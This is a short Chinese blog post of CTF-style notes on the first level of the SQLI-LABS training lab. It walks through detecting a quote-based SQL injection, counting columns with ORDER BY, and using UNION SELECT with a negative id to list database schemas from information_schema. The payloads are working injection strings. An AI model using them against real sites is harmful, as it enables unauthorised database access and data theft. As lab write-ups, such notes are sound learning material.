---
layout: post
title: "SQLI-LABS 闯关笔记"
date: 2019-4-13 20:49:43
author: co0ontty
categories: CTF WEB MYSQL ALL
tags: CTF WEB MYSQL ALL 
describe: SQLI-LABS 闯关笔记 
---
## Less-1
```php
?id=1'
```
报错：  
```php
 near ''1'' LIMIT 0,1' at line 1
```
推断查询语句为：  
```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```
构造注入语句：
用单引号闭合id='的前单引号
用--+ 闭合id=''的后单引号
```php
?id=1'order by 1 --+ 
$sql="SELECT * FROM users WHERE id='1'order by 1 --+ ' LIMIT 0,1";
```
查看有多少字段，当输入到4的时候报错，说明存在3个字段  
```php
?id=1'order by 4 --+
```
联合查询union 
```php
?id=1' union select 1,2,3 --+
```
正常显示，猜测函数mysql_fetch_array只被调用了一次，而mysql_fetch_array() 函数从结果集中取得一行作为关联数组，即只显示一行数据。  
那么我们只要让第一行查询的结果是空集（即union左边的select子句查询结果为空），那么我们union右边的查询结果自然就成为了第一行，就打印在网页上了，这个id他一般传的是数字，而且一般都是从1开始自增的，我们可以把id值设为非正数（负数或0），浮点数，字符型或字符串，即设置为数据库中查询不到的id值。
```php
?id=-1' union select 1,2,3 --+
```
查询数据库:  
```php
?id=e' union select 1,2, (select group_concat(schema_name) from information_schema.schemata) -- +
```  